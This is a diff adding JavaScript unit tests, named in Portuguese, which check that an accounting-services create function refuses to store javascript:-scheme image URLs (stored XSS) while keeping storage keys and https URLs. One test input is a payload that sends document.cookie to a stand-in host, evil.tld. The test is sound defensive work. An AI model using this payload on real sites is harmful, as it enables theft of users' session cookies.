@@ -852,3 +852,43 @@ test('normalizeIntakeStartMode: default é formulário primeiro', () => {
   assert.equal(accountingServicesService.normalizeIntakeStartMode('calendar'), 'calendar');
   assert.equal(accountingServicesService.normalizeIntakeStartMode('outro'), 'form');
 });
+
+test('create: rejeita imageUrl com esquema javascript: em vez de gravar cru (stored XSS)', async () => {
+  resetMocks();
+  let savedImageUrl = 'não-chamado';
+  mock.method(accountingServicesRepository, 'createRow', async (args) => {
+    savedImageUrl = args.imageUrl;
+    return { id: 'svc-1', ...args };
+  });
+
+  await accountingServicesService.create({
+    firmId: 'firm-x',
+    payload: {
+      name: 'Consultoria',
+      durationMinutes: 60,
+      imageUrl: "javascript:fetch('//evil.tld/x?c='+document.cookie)",
+    },
+  });
+
+  assert.equal(savedImageUrl, null, 'URI javascript: nunca deve chegar ao INSERT');
+});
+
+test('create: preserva storage key própria (firm/...) e URL https legítima em imageUrl', async () => {
+  resetMocks();
+  const saved = [];
+  mock.method(accountingServicesRepository, 'createRow', async (args) => {
+    saved.push(args.imageUrl);
+    return { id: 'svc-1', ...args };
+  });
+
+  await accountingServicesService.create({
+    firmId: 'firm-x',
+    payload: { name: 'A', durationMinutes: 30, imageUrl: 'firm/firm-x/services/img.png' },
+  });
+  await accountingServicesService.create({
+    firmId: 'firm-x',
+    payload: { name: 'B', durationMinutes: 30, imageUrl: 'https://cdn.teglion.com/img.png' },
+  });
+
+  assert.deepEqual(saved, ['firm/firm-x/services/img.png', 'https://cdn.teglion.com/img.png']);
+});
